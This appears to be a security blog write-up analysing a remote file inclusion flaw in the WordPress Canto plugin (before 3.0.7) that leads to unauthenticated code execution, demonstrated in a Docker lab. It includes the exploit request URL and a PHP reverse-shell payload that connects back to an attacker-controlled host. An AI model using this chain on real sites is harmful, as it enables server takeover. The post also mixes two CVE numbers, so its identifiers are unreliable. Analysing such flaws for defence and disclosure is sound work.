---
layout: post
title:  "CVE-2024-25096 - Unauthenticated RCE Analysis"
date:   2025-10-31 10:25:56 +0700
categories: wordpress
---
# Info:

Type: Remote Code Execution

Plugin Name: **Canto**

Version: < 3.0.7

**Base Score:** [**9.8 CRITICAL**](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2024-38773&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)

**Vector:**  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

NIST: [NIST](https://nvd.nist.gov/vuln/detail/CVE-2024-38773)

WPScan: [WPScan](https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4/)

# PoC:
See the WordPress and plugin setup instructions [here](https://t0t0r0o.github.io/writeups/wordpress/2025/10/29/setup.html).

Start WordPress in Docker on port 9000 and install the Canto plugin version 3.0.6.

In the library folder of the plugin, files call `/wp-admin/admin.php` using `require_once urldecode($_REQUEST['wp_abspath']) . '/wp-admin/admin.php';`

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image.png)

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-2.png)

The `require_once urldecode($_REQUEST['wp_abspath']) . '/wp-admin/admin.php';` statement loads the contents of `admin.php` into the current script. For example, if a user provides `?wp_abspath=/etc/passwd` the required path becomes `require_once '/etc/passwd/wp-admin/admin.php';`. We inspected the code by debugging as shown below.

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-3.png)

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-4.png)

At this point the issue appears to be an LFI (Local File Inclusion). However, exploitation is difficult because the code appends `/wp-admin/admin.php` to the provided path, which usually results in a non-existent path on the target system. Requests typically return HTTP 500.

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-5.png)

Although internal files cannot be read directly via the local file system, we can host a malicious file on a remote server and have the target `require_once` it.

Create a server that returns PHP code:

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-6.png)

Run the PoC server on port 6000 with: `php -S 0.0.0.0:6000`

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-7.png)

Because the lab runs WordPress inside Docker, replace localhost with the Docker host IP (for example `172.17.0.1`). Then request:
`http://localhost:9000/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://172.17.0.1:6000`

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-8.png)

Create a reverse shell payload for the remote PHP file:

```php
<?php
header("Content-Type: text/plain");

echo '<?php $sock=fsockopen("172.17.0.1",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>';
```

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-2.png)

Note: This exploitation method only works if `allow_url_include = On` is enabled in the target PHP configuration.
